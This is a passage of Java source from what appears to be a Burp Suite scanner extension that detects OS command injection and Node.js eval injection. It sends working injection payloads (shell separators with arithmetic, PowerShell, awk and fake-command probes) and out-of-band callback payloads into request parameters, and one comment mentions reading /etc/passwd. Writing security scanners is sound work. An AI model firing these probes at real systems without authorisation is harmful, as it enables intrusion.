                    .build());
            return true;
        }
        return false;
    }

    // ==================== OUTPUT-BASED DETECTION ====================

    private boolean testOutputBased(HttpRequestResponse original, CmdiTarget target, String url,
                                     String baselineBody, String[][] payloads, String osType)
            throws InterruptedException {

        for (String[] payloadInfo : payloads) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            String payload = payloadInfo[0];
            String expectedOutput = payloadInfo[1];
            String technique = payloadInfo[2];


            HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
            if (result == null || result.response() == null) continue;
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            // Empty body is never evidence of command execution
            if (body == null || body.isEmpty()) continue;

            if (!expectedOutput.isEmpty()) {
                boolean matched;
                boolean baselineMatched;
                String matchedEvidence = null; // actual matched text for responseEvidence

                if (expectedOutput.startsWith("REGEX:")) {
                    // Regex-based matching (e.g., for echo-wrapped whoami output)
                    Pattern regexPattern = Pattern.compile(expectedOutput.substring(6));
                    java.util.regex.Matcher regexMatcher = regexPattern.matcher(body);
                    matched = regexMatcher.find();
                    if (matched) {
                        matchedEvidence = regexMatcher.group();
                    }
                    baselineMatched = !baselineBody.isEmpty() && regexPattern.matcher(baselineBody).find();
                    // If baseline is empty, we can't distinguish command output from natural content → skip
                    if (baselineBody.isEmpty()) { perHostDelay(); continue; }
                } else {
                    // Simple string contains matching
                    matched = body.contains(expectedOutput);
                    matchedEvidence = expectedOutput;
                    baselineMatched = !baselineBody.isEmpty() && baselineBody.contains(expectedOutput);
                    if (baselineBody.isEmpty()) { perHostDelay(); continue; }
                }

                if (matched && !baselineMatched) {
                    Finding.Builder findingBuilder = Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Output-Based) - " + osType,
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Technique: " + technique
                                    + " | Payload: " + payload
                                    + " | Output found: " + expectedOutput)
                            .description("Command injection confirmed. Command output matching '"
                                    + expectedOutput + "' found in response via " + technique + ". "
                                    + "Parameter '" + target.name + "' allows OS command execution.")
                            .payload(payload)
                            .requestResponse(result);
                    if (matchedEvidence != null) {
                        findingBuilder.responseEvidence(matchedEvidence);
                    }
                    findingsStore.addFinding(findingBuilder.build());
                    return true;
                }
            }
            perHostDelay();
        }
        return false;
    }

    // ==================== WINDOWS MATH + ERROR DETECTION ====================

    /**
     * Windows command injection verification via two independent probes.
     *
     * <p>Either probe passing is sufficient to confirm injection. False-positive protection
     * comes from the randomness of the values — no pre-existing page content can coincidentally
     * match either check:</p>
     *
     * <ul>
     *   <li><b>Probe A (stdout)</b>: Injects {@code <sep> set /a a*b <sep>} with random operands.
     *       The shell computes and outputs the product. Input reflection cannot produce the
     *       computed answer — covers apps that return stdout but suppress stderr.</li>
     *   <li><b>Probe B (stderr)</b>: Injects {@code <sep> <random_12alpha_cmd> <sep>}.
     *       The Windows error {@code '<random_cmd>' is not recognized...} containing our specific
     *       random string is independently conclusive — covers apps that surface stderr but
     *       suppress stdout.</li>
     * </ul>
     *
     * <p>Fresh random values are generated per probe per separator so repeated invocations
     * never share markers — no dedup pollution across parameters.</p>
     */
    private boolean testWindowsEchoError(HttpRequestResponse original, CmdiTarget target,
                                          String url, String baselineBody)
            throws InterruptedException {

        // [prefix, suffix] separator pairs — mirrors the existing Windows output payloads format
        String[][] seps = {
            {"& ",  " &"},
            {"&& ", " &&"},
            {"| ",  ""},
            {"\n",  "\n"},
            {"; ",  ""},
        };

        for (String[] sep : seps) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            String pre = sep[0];
            String suf = sep[1];

            // ── Probe A: stdout path (arithmetic calculation) ────────────────────
            // "set /a a*b" outputs only the computed result — the shell consumes the
            // expression entirely. Input reflection can never produce the answer, so no
            // anti-reflection guard is needed.
            int    a           = 1000 + SECURE_RANDOM.nextInt(9000);
            int    b           = 1000 + SECURE_RANDOM.nextInt(9000);
            String expected    = String.valueOf((long) a * b);
            String mathPayload = pre + "set /a " + a + "*" + b + suf;
            HttpRequestResponse mathResult = sendPayload(original, target, target.originalValue + mathPayload);
            if (mathResult != null && mathResult.response() != null && ResponseGuard.isUsableResponse(mathResult)) {
                String mathBody = mathResult.response().bodyToString();
                if (mathBody != null && mathBody.contains(expected) && !baselineBody.contains(expected)) {
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Math Calculation) - Windows",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Probe A (stdout): payload='" + mathPayload + "' | computed result '"
                                    + expected + "' (" + a + "*" + b + ") in response, absent in baseline")
                            .description("Windows OS command injection confirmed via arithmetic calculation. "
                                    + "'set /a " + a + "*" + b + "' was injected; the server returned "
                                    + "the computed result '" + expected + "' in the response body. "
                                    + "Only actual shell execution can produce this value — "
                                    + "input reflection cannot compute the answer. "
                                    + "Parameter '" + target.name + "' allows arbitrary Windows command execution.")
                            .responseEvidence(expected)
                            .payload(mathPayload)
                            .requestResponse(mathResult)
                            .build());
                    return true;
                }
            }
            perHostDelay();
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;

            // ── Probe A2: PowerShell arithmetic (secondary stdout path) ──────────
            // Different execution path from set /a — bypasses filters that block cmd builtins.
            // powershell outputs only the numeric result; reflection cannot produce the answer.
            int    a2      = 1000 + SECURE_RANDOM.nextInt(9000);
            int    b2      = 1000 + SECURE_RANDOM.nextInt(9000);
            String exp2    = String.valueOf((long) a2 * b2);
            String psPayload = pre + "powershell -NonInteractive -NoProfile -command \"" + a2 + "*" + b2 + "\"" + suf;
            HttpRequestResponse psResult = sendPayload(original, target, target.originalValue + psPayload);
            if (psResult != null && psResult.response() != null && ResponseGuard.isUsableResponse(psResult)) {
                String psBody = psResult.response().bodyToString();
                if (psBody != null && psBody.contains(exp2) && !baselineBody.contains(exp2)) {
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Math Calculation via PowerShell) - Windows",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Probe A2 (PowerShell): payload='" + psPayload + "' | computed result '"
                                    + exp2 + "' (" + a2 + "*" + b2 + ") in response, absent in baseline")
                            .description("Windows OS command injection confirmed via PowerShell arithmetic. "
                                    + "'powershell -command " + a2 + "*" + b2 + "' was injected; "
                                    + "the server returned the computed result '" + exp2 + "'. "
                                    + "Only actual PowerShell execution can produce this value. "
                                    + "Parameter '" + target.name + "' allows arbitrary Windows command execution.")
                            .responseEvidence(exp2)
                            .payload(psPayload)
                            .requestResponse(psResult)
                            .build());
                    return true;
                }
            }
            perHostDelay();
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;

            // ── Probe B: stderr path (error reflection) ──────────────────────────
            // Fresh fake command per probe — the error text contains OUR specific random string,
            // making it independently unforgeable even without stdout confirmation.
            String fakeCmd     = randomAlpha(12);
            String errorPayload = pre + fakeCmd + suf;
            HttpRequestResponse errorResult = sendPayload(original, target, target.originalValue + errorPayload);
            if (errorResult != null && errorResult.response() != null && ResponseGuard.isUsableResponse(errorResult)) {
                String errorBody = errorResult.response().bodyToString();
                // Windows error phrase — check all single-quote encodings the app may emit:
                //   literal: 'fakeCmd' is not recognized...
                //   HTML decimal entity: &#39;fakeCmd&#39; is not recognized...
                //   XHTML named entity:  &apos;fakeCmd&apos; is not recognized...
                String suffix       = fakeCmd + "' is not recognized as an internal or external command";
                String litForm      = "'" + suffix;
                String htmlForm     = "&#39;" + fakeCmd + "&#39; is not recognized as an internal or external command";
                String aposForm     = "&apos;" + fakeCmd + "&apos; is not recognized as an internal or external command";
                boolean inBody      = errorBody != null &&
                                      (errorBody.contains(litForm) || errorBody.contains(htmlForm) || errorBody.contains(aposForm));
                boolean inBaseline  = baselineBody.contains(litForm) || baselineBody.contains(htmlForm) || baselineBody.contains(aposForm);
                if (inBody && !inBaseline) {
                    // Use whichever form matched for evidence display
                    String matchedForm = errorBody.contains(htmlForm) ? htmlForm
                                       : errorBody.contains(aposForm) ? aposForm
                                       : litForm;
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Error Reflection) - Windows",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Probe B (stderr): payload='" + errorPayload + "' | Windows error '"
                                    + matchedForm + "' in response, absent in baseline")
                            .description("Windows OS command injection confirmed via error reflection. "
                                    + "The random non-existent command '" + fakeCmd + "' was injected and "
                                    + "Windows returned its exact 'is not recognized' error message in the "
                                    + "HTTP response, confirming the application surfaces stderr. "
                                    + "Parameter '" + target.name + "' allows arbitrary Windows command execution.")
                            .responseEvidence(matchedForm)
                            .payload(errorPayload)
                            .requestResponse(errorResult)
                            .build());
                    return true;
                }
            }
            perHostDelay();
        }
        return false;
    }

    // ==================== LINUX MATH + ERROR DETECTION ====================

    /**
     * Linux command injection verification via two independent probes per separator.
     *
     * <ul>
     *   <li><b>Probe A (stdout)</b>: {@code expr a \* b} with random operands. The shell outputs
     *       only the computed product — no keyword in the output, so input reflection cannot
     *       produce the answer. Covers apps that return stdout (e.g. Node child_process JSON).</li>
     *   <li><b>Probe B (stderr)</b>: Random fake command. Checks for sh/dash
     *       {@code "fakecmd: not found"}, bash {@code "fakecmd: command not found"}, and
     *       zsh {@code "command not found: fakecmd"}. Covers apps that surface only stderr.</li>
     * </ul>
     */
    private boolean testLinuxMathError(HttpRequestResponse original, CmdiTarget target,
                                        String url, String baselineBody)
            throws InterruptedException {

        String[][] seps = {
            {"; ", ";"},
            {"\n", "\n"},
            {"&& ", ""},
            {"|| ", ""},
            {"| ", ""},
        };

        for (String[] sep : seps) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            String pre = sep[0];
            String suf = sep[1];

            // ── Probe A: stdout path (arithmetic via expr) ────────────────────
            // expr outputs only the computed result — the shell consumes the expression.
            // \* prevents glob expansion of * by the shell.
            int    a          = 1000 + SECURE_RANDOM.nextInt(9000);
            int    b          = 1000 + SECURE_RANDOM.nextInt(9000);
            String expected   = String.valueOf((long) a * b);
            String mathPayload = pre + "expr " + a + " \\* " + b + suf;
            HttpRequestResponse mathResult = sendPayload(original, target, target.originalValue + mathPayload);
            if (mathResult != null && mathResult.response() != null && ResponseGuard.isUsableResponse(mathResult)) {
                String mathBody = mathResult.response().bodyToString();
                if (mathBody != null && mathBody.contains(expected) && !baselineBody.contains(expected)) {
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Arithmetic Output) - Unix",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Probe A (stdout): payload='" + mathPayload + "' | computed result '"
                                    + expected + "' (" + a + " * " + b + ") in response, absent in baseline")
                            .description("Unix OS command injection confirmed via arithmetic output. "
                                    + "'expr " + a + " \\* " + b + "' was injected; the server returned "
                                    + "the computed result '" + expected + "' in the response body. "
                                    + "Only actual shell execution can produce this value — "
                                    + "input reflection cannot compute the answer. "
                                    + "Parameter '" + target.name + "' allows arbitrary Unix command execution.")
                            .responseEvidence(expected)
                            .payload(mathPayload)
                            .requestResponse(mathResult)
                            .build());
                    return true;
                }
            }
            perHostDelay();
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;

            // ── Probe A2: awk arithmetic (secondary stdout path) ──────────────
            // Different binary from expr — bypasses filters that block expr specifically.
            // BEGIN block runs before any input is read, so | piping doesn't interfere;
            // exit prevents awk from hanging on stdin when used with pipe separators.
            int    a2       = 1000 + SECURE_RANDOM.nextInt(9000);
            int    b2       = 1000 + SECURE_RANDOM.nextInt(9000);
            String exp2     = String.valueOf((long) a2 * b2);
            String awkPayload = pre + "awk 'BEGIN{print " + a2 + "*" + b2 + "; exit}'" + suf;
            HttpRequestResponse awkResult = sendPayload(original, target, target.originalValue + awkPayload);
            if (awkResult != null && awkResult.response() != null && ResponseGuard.isUsableResponse(awkResult)) {
                String awkBody = awkResult.response().bodyToString();
                if (awkBody != null && awkBody.contains(exp2) && !baselineBody.contains(exp2)) {
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Arithmetic Output via awk) - Unix",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Probe A2 (awk): payload='" + awkPayload + "' | computed result '"
                                    + exp2 + "' (" + a2 + "*" + b2 + ") in response, absent in baseline")
                            .description("Unix OS command injection confirmed via awk arithmetic. "
                                    + "'awk BEGIN{print " + a2 + "*" + b2 + "}' was injected; "
                                    + "the server returned the computed result '" + exp2 + "'. "
                                    + "Only actual awk execution can produce this value. "
                                    + "Parameter '" + target.name + "' allows arbitrary Unix command execution.")
                            .responseEvidence(exp2)
                            .payload(awkPayload)
                            .requestResponse(awkResult)
                            .build());
                    return true;
                }
            }
            perHostDelay();
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;

            // ── Probe B: stderr path (command not found) ──────────────────────
            // sh/dash:  "fakecmd: not found"
            // bash:     "fakecmd: command not found"
            // zsh:      "command not found: fakecmd"
            // Each shell variant contains our specific random fakeCmd — independently unforgeable.
            String fakeCmd     = randomAlpha(12);
            String errorPayload = pre + fakeCmd + suf;
            HttpRequestResponse errorResult = sendPayload(original, target, target.originalValue + errorPayload);
            if (errorResult != null && errorResult.response() != null && ResponseGuard.isUsableResponse(errorResult)) {
                String errorBody    = errorResult.response().bodyToString();
                boolean shForm      = errorBody != null && errorBody.contains(fakeCmd + ": not found");
                boolean bashForm    = errorBody != null && errorBody.contains(fakeCmd + ": command not found");
                boolean zshForm     = errorBody != null && errorBody.contains("command not found: " + fakeCmd);
                boolean inBaseline  = baselineBody.contains(fakeCmd + ": not found")
                                   || baselineBody.contains(fakeCmd + ": command not found")
                                   || baselineBody.contains("command not found: " + fakeCmd);
                if ((shForm || bashForm || zshForm) && !inBaseline) {
                    String matchedForm = shForm   ? fakeCmd + ": not found"
                                       : bashForm ? fakeCmd + ": command not found"
                                       :            "command not found: " + fakeCmd;
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Error Reflection) - Unix",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Probe B (stderr): payload='" + errorPayload + "' | Unix shell error '"
                                    + matchedForm + "' in response, absent in baseline")
                            .description("Unix OS command injection confirmed via shell error reflection. "
                                    + "The random non-existent command '" + fakeCmd + "' was injected and "
                                    + "the shell returned its exact 'not found' error message in the "
                                    + "HTTP response, confirming the application surfaces stderr. "
                                    + "Parameter '" + target.name + "' allows arbitrary Unix command execution.")
                            .responseEvidence(matchedForm)
                            .payload(errorPayload)
                            .requestResponse(errorResult)
                            .build());
                    return true;
                }
            }
            perHostDelay();
        }
        return false;
    }

    /** Returns {@code len} random bytes encoded as lowercase hex. */
    private static String randomHex(int bytes) {
        byte[] b = new byte[bytes];
        SECURE_RANDOM.nextBytes(b);
        StringBuilder sb = new StringBuilder(bytes * 2);
        for (byte x : b) sb.append(String.format("%02x", x));
        return sb.toString();
    }

    /** Returns {@code len} random lowercase ASCII letters (a–z). */
    private static String randomAlpha(int len) {
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) {
            sb.append((char) ('a' + SECURE_RANDOM.nextInt(26)));
        }
        return sb.toString();
    }

    // ==================== NODE.JS SSJI ====================

    /**
     * Node.js Server-Side JavaScript Injection — three sub-phases:
     *   6a. JS arithmetic output (confirms eval injection without needing shell cmds)
     *   6b. execSync output-based (id / /etc/passwd — confirms OS command execution)
     *   6c. Time-based blind (gated by TimingLock — only when UI toggle is on)
     *
     * OOB has already been dispatched in Phase 1 alongside traditional OOB so that
     * SSJI callbacks are not delayed behind 30+ minutes of time-based probing.
     */
    private void testNodejsInjection(HttpRequestResponse original, CmdiTarget target, String url,
                                      long baselineTime, String baselineBody, int delaySecs)
            throws InterruptedException {

        // OOB already fired in Phase 1 — skip here and check if already confirmed.
        if (oobConfirmedParams.contains(target.name)) return;

        // Sub-phase 6a: JS arithmetic output — proves eval injection without requiring shell access.
        // Injects (A*B).toString() with random operands per context breaker. The result is
        // unforgeable by input reflection alone, and appears in the response even when the app
        // passes the eval result to another function (unlike id/passwd which only appear if echoed).
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        if (config.getBool("cmdi.output.enabled", true)) {
            if (testNodejsMath(original, target, url, baselineBody)) return;
        }
        if (oobConfirmedParams.contains(target.name)) return;

        // Sub-phase 6b: execSync output-based (id, /etc/passwd reflected in response body).
        // Proves OS command execution when command output is surfaced in the JSON response.
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        if (config.getBool("cmdi.output.enabled", true)) {
            if (testOutputBased(original, target, url, baselineBody, NODEJS_OUTPUT_PAYLOADS, "Node.js SSJI")) return;
        }
        if (oobConfirmedParams.contains(target.name)) return;

        // Sub-phase 6c: Time-based blind — requires the global "Time-Based Testing" UI toggle
        if (!TimingLock.isEnabled()) return;
        if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
        try {
            TimingLock.acquire();
            testTimeBased(original, target, url, baselineTime, delaySecs, NODEJS_TIME_PAYLOADS, "Node.js SSJI");
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } finally {
            TimingLock.release();
        }
    }

    // ==================== NODE.JS SSJI MATH PROBE ====================

    /**
     * Confirms JS eval injection via arithmetic output — SSJI equivalent of testLinuxMathError.
     *
     * <p>For each context breaker, injects {@code ORIGINAL + BREAKER + (A*B).toString()//} with
     * fresh random operands. The result ({@code A*B}) appears in the response if the eval executes.
     *
     * <p>Why {@code .toString()}: ensures the product is coerced to a string before the {@code +}
     * operator, so {@code leftSide + "7006652"} always concatenates (JS string coercion) and the
     * result always CONTAINS the exact number, regardless of what the left side evaluates to.
     * Input reflection can never compute {@code A*B} — it would need to evaluate the expression.
     *
     * <p>Why this beats id/passwd for initial detection: the arithmetic result appears in the
     * response even when the app passes the eval result to another function (e.g., QR generator,
     * template renderer) that may surface it in an error or partial output. The {@code id} output
     * only appears if the server explicitly echoes command stdout back to the client.
     */
    private boolean testNodejsMath(HttpRequestResponse original, CmdiTarget target,
                                    String url, String baselineBody)
            throws InterruptedException {

        // Same context breakers as the OOB/time/output payload arrays — covers the five most
        // common Node.js eval idioms.
        String[] breakers = {
            String.valueOf('\''),                           // '       eval("'" + input + "'")
            String.valueOf('\'') + ")",                     // ')      eval(fn(input))
            String.valueOf('\'') + "})",                    // '})     eval(fn({key: input}))
            String.valueOf('\'') + "))",                    // '))     eval(outer(inner(input)))
            String.valueOf('\'') + "}}" + "))",             // '}}))   eval(outer({key: inner({k:input})}))
        };

        for (String breaker : breakers) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            if (oobConfirmedParams.contains(target.name)) return false;

            int a = 1000 + SECURE_RANDOM.nextInt(9000);
            int b = 1000 + SECURE_RANDOM.nextInt(9000);
            String expectedStr = String.valueOf((long) a * b);

            // .toString() coerces the number to a string so that JS + always concatenates,
            // making the result always contain the exact product regardless of left-side type.
            // // is a JS single-line comment — silences trailing eval string characters.
            String payload = breaker + " + (" + a + "*" + b + ").toString()//";

            HttpRequestResponse result = sendPayload(original, target, target.originalValue + payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null || body.isEmpty()) { perHostDelay(); continue; }
            if (baselineBody.isEmpty()) { perHostDelay(); continue; }

            // Word-boundary check: the product must appear as a standalone number, not as a
            // substring of a larger number (e.g. "7006652" inside "17006652" would be a FP).
            boolean standaloneInBody = containsStandaloneNumber(body, expectedStr);
            boolean standaloneInBaseline = containsStandaloneNumber(baselineBody, expectedStr);

            if (standaloneInBody && !standaloneInBaseline) {
                findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                "Server-Side JavaScript Injection (Arithmetic Output)",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Context breaker: '" + breaker + "'"
                                + " | Payload: " + payload
                                + " | JS product '" + expectedStr + "' (" + a + "*" + b + ") in response, absent in baseline")
                        .description("Server-side JavaScript injection confirmed via arithmetic evaluation. "
                                + "The expression (" + a + "*" + b + ") was injected into a JS eval context. "
                                + "The server returned the computed product '" + expectedStr + "' in its response. "
                                + "Only actual JavaScript execution can produce this value — "
                                + "input reflection cannot evaluate the arithmetic expression. "
                                + "Parameter '" + target.name + "' is vulnerable to SSJI (eval injection).")
                        .responseEvidence(expectedStr)
                        .payload(payload)
                        .requestResponse(result)
                        .build());
                return true;
            }
            perHostDelay();
        }
        return false;
    }

    /**
     * Returns true if {@code number} appears in {@code body} as a standalone numeric token —
     * not immediately adjacent to another digit. Prevents false positives from a product like
     * "7006652" matching inside a larger number such as "17006652" or "70066520".
     */
    private static boolean containsStandaloneNumber(String body, String number) {
        if (body == null || body.isEmpty() || number == null || number.isEmpty()) return false;
        int idx = body.indexOf(number);
        while (idx >= 0) {
            boolean prevOk = idx == 0 || !Character.isDigit(body.charAt(idx - 1));
            boolean nextOk = (idx + number.length() >= body.length())
                          || !Character.isDigit(body.charAt(idx + number.length()));
            if (prevOk && nextOk) return true;
            idx = body.indexOf(number, idx + 1);
        }
        return false;
    }

    private void testNodejsOob(HttpRequestResponse original, CmdiTarget target, String url)
            throws InterruptedException {
        for (String[] payloadInfo : NODEJS_OOB_PAYLOADS) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            if (oobConfirmedParams.contains(target.name)) return;
            sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Node.js SSJI");
        }
    }

    // ==================== OOB VIA COLLABORATOR ====================

    private void testOob(HttpRequestResponse original, CmdiTarget target, String url) throws InterruptedException {
        // Unix OOB payloads
        if (config.getBool("cmdi.unix.enabled", true)) {
            for (String[] payloadInfo : OOB_PAYLOADS_UNIX) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
                sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Unix");
            }
        }

        // Windows OOB payloads
        if (config.getBool("cmdi.windows.enabled", true)) {
            for (String[] payloadInfo : OOB_PAYLOADS_WINDOWS) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
                sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Windows");
            }
        }
    }

    private void sendOobPayload(HttpRequestResponse original, CmdiTarget target,
                                 String url, String payloadTemplate, String technique, String osType)
            throws InterruptedException {

        // AtomicReference to capture the sent request/response for the finding
        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
        // AtomicReference to capture the final payload string for the finding
        AtomicReference<String> sentPayload = new AtomicReference<>();

        String collabPayload = collaboratorManager.generatePayload(
                "cmdi-scanner", url, target.name,
                "CmdI OOB " + technique,
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
                    // fires on a 5-second interval so this race is rare, but when it happens the 50ms
                    // wait is almost always enough for the sending thread to complete its set() call.
                    for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    // Mark parameter as confirmed — skip all remaining phases (HTTP only, DNS continues scanning)
                    if (interaction.type() == InteractionType.HTTP) {
                        oobConfirmedParams.add(target.name);
                    }
                    findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                    "OS Command Injection (Out-of-Band) - " + osType,
                                    Severity.CRITICAL,
                                    interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Technique: " + technique + " (" + osType + ")"
                                    + " | Collaborator " + interaction.type().name()
                                    + " interaction from " + interaction.clientIp()
                                    + " at " + interaction.timeStamp())
                            .description("OS command injection confirmed via Burp Collaborator. "
                                    + "The server executed " + technique + " which triggered a "
                                    + interaction.type().name() + " callback. "
                                    + "Parameter '" + target.name + "' allows arbitrary command execution.")
                            .payload(sentPayload.get())
                            .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                            .build());
                    api.logging().logToOutput("[CmdI OOB] Confirmed! " + interaction.type()
                            + " interaction for " + url + " param=" + target.name
                            + " technique=" + technique + " OS=" + osType);
                }
        );

        if (collabPayload == null) return;

        String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);

        sentPayload.set(payload);
        HttpRequestResponse oobResult = sendPayload(original, target, target.originalValue + payload);
        sentRequest.set(oobResult);
        if (oobResult != null && !ResponseGuard.isUsableResponse(oobResult)) { perHostDelay(); return; }

        api.logging().logToOutput("[CmdI OOB] Sent " + technique + " payload to " + url
                + " param=" + target.name + " collab=" + collabPayload);

        perHostDelay();
    }

    // ==================== HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, CmdiTarget target, String payload) {
        if (com.omnistrike.framework.ScanState.isCancelled()) return null;
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    /** Result of a timed request, bundling elapsed time and the response together to avoid races. */
    private static class TimedResult {
        final long elapsedMs;
        final HttpRequestResponse response;
        TimedResult(long elapsedMs, HttpRequestResponse response) {
            this.elapsedMs = elapsedMs;
            this.response = response;
        }
    }

    private TimedResult measureResponseTime(HttpRequestResponse original, CmdiTarget target, String payload) {
        long start = System.currentTimeMillis();
        HttpRequestResponse response = sendPayload(original, target, payload);
        long elapsed = System.currentTimeMillis() - start;
        return new TimedResult(elapsed, response);
    }

    /**
     * Returns true if the response is a small error page that should never be treated as
     * evidence of command execution. 403/404/500 with body under 500 bytes typically indicates
     * WAF blocking, routing errors, or server rejection — not actual command execution.
     * Also returns true for null/empty responses.
     */
    private boolean isSmallErrorPage(HttpRequestResponse result) {
        if (result == null || result.response() == null) return true;
        String body = result.response().bodyToString();
        if (body == null || body.isEmpty()) return true;
        int status = result.response().statusCode();
        return (status == 403 || status == 404 || status == 429 || status == 500 || status == 503) && body.length() < 500;
    }

    private HttpRequest injectPayload(HttpRequest request, CmdiTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                if (target.name.contains(".")) {
                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
                    String newBody = replaceNestedJsonValue(body, target.name, payload);
                    return request.withBody(newBody);
                } else {
                    String pattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
                    return request.withBody(body.replaceFirst(pattern, replacement));
                }
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            case PATH_SEGMENT:
                return injectPathSegmentPayload(request, target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Inject a payload into a URL path segment, replacing the segment identified by name.
     * The target.name format is "path:INDEX:ORIGINAL_VALUE".
     */
    private HttpRequest injectPathSegmentPayload(HttpRequest request, String targetName, String payload) {
        try {
            String[] parts = targetName.split(":", 3);
            if (parts.length < 3) return request;
            int segmentIndex = Integer.parseInt(parts[1]);

            String path = extractPath(request.url());
            String[] segments = path.split("/");

            if (segmentIndex < 0 || segmentIndex >= segments.length) return request;

            segments[segmentIndex] = PayloadEncoder.encode(payload);
            String newPath = String.join("/", segments);

            // Preserve query string if present
            String fullPath = request.path();
            int queryIdx = fullPath.indexOf('?');
            if (queryIdx >= 0) {
                newPath = newPath + fullPath.substring(queryIdx);
            }

            return request.withPath(newPath);
        } catch (Exception e) {
            api.logging().logToError("[CmdI] injectPathSegmentPayload failed: " + e.getMessage());
            return request;
        }
    }

    /**
     * Replace a value at a dot-notation path in a JSON string.
     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
     */
    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
        try {
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
            if (!root.isJsonObject()) return jsonBody;

            String[] parts = dotPath.split("\\.");
            com.google.gson.JsonObject current = root.getAsJsonObject();

            // Traverse to the parent of the target key
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return jsonBody;
                current = child.getAsJsonObject();
            }

            // Replace the leaf value
            String leafKey = parts[parts.length - 1];
            if (current.has(leafKey)) {
                current.addProperty(leafKey, escapedValue);
            }

            return new com.google.gson.Gson().toJson(root);
        } catch (Exception e) {
            return jsonBody;
        }
    }

    private List<CmdiTarget> extractTargets(HttpRequest request) {
        List<CmdiTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.QUERY));
                    break;
                case BODY:
